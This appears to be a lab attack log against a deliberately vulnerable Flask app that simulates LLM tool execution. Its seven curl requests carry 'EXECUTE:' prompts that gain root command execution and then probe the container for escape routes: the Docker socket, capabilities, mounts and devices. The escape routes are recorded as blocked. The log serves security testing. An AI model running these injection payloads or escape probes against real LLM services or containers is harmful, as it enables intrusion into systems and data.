# Attack Log - LLM Container Escape Testing

## Test Environment
- Container: vulnerable-llm (custom Flask app simulating LLM tool execution)
- Host: Kali Linux, Docker 28.5.2
- Date: 2026-07-02

---

## Test 1 - Baseline Response
**Command:**
```bash
curl -X POST http://localhost:5000/generate -H "Content-Type: application/json" -d '{"prompt": "Hello AI"}'
```
**Response:**
```json
{"response":"Simulated LLM response to: Hello AI"}
```

---

## Test 2 - Command Injection (whoami)
**Command:**
```bash
curl -X POST http://localhost:5000/generate -H "Content-Type: application/json" -d '{"prompt": "EXECUTE: whoami"}'
```
**Response:**
```json
{"response":"root\n","vulnerability":"command_injection_triggered"}
```
**Result:** CRITICAL - RCE confirmed, running as root

---

## Test 3 - Cgroup Check
**Command:**
```bash
curl -X POST http://localhost:5000/generate -H "Content-Type: application/json" -d '{"prompt": "EXECUTE: cat /proc/1/cgroup"}'
```
**Response:**
```json
{"response":"0::/\n","vulnerability":"command_injection_triggered"}
```
**Result:** Confirmed cgroup v2, containerized environment

---

## Test 4 - Docker Socket Check
**Command:**
```bash
curl -X POST http://localhost:5000/generate -H "Content-Type: application/json" -d '{"prompt": "EXECUTE: ls -la /var/run/docker.sock"}'
```
**Response:**
```json
{"response":"","vulnerability":"command_injection_triggered"}
```
**Result:** No socket exposed - escape vector blocked

---

## Test 5 - Capability Check
**Command:**
```bash
curl -X POST http://localhost:5000/generate -H "Content-Type: application/json" -d '{"prompt": "EXECUTE: cat /proc/1/status | grep Cap"}'
```
**Response:**
```json
{"response":"CapInh:\t0000000000000000\nCapPrm:\t00000000a80425fb\nCapEff:\t00000000a80425fb\nCapBnd:\t00000000a80425fb\nCapAmb:\t0000000000000000\n","vulnerability":"command_injection_triggered"}
```
**Result:** Default Docker capability set, needs decode analysis

---

## Test 6 - Mount Point Check
**Command:**
```bash
curl -X POST http://localhost:5000/generate -H "Content-Type: application/json" -d '{"prompt": "EXECUTE: mount | grep -i docker"}'
```
**Response:**
```json
{"response":"overlay on / type overlay (rw,relatime,lowerdir=...)\n","vulnerability":"command_injection_triggered"}
```
**Result:** Only overlay2 filesystem, no host mounts - escape vector blocked

---

## Test 7 - Device Access Check
**Command:**
```bash
curl -X POST http://localhost:5000/generate -H "Content-Type: application/json" -d '{"prompt": "EXECUTE: cat /sys/fs/cgroup/memory.max 2>/dev/null; ls -la /dev/"}'
```
**Response:**
```json
{"response":"max\ntotal 4\ndrwxr-xr-x 5 root root  340 Jul  2 09:16 .\n...(standard /dev listing)...","vulnerability":"command_injection_triggered"}
```
**Result:** Standard /dev, not privileged mode - escape vector blocked

---

## Summary
- 7 tests conducted
- 1 CRITICAL RCE vulnerability confirmed (command injection)
- 3 container escape vectors tested and blocked (Docker isolation held)
- Root-level access achieved within container boundary only
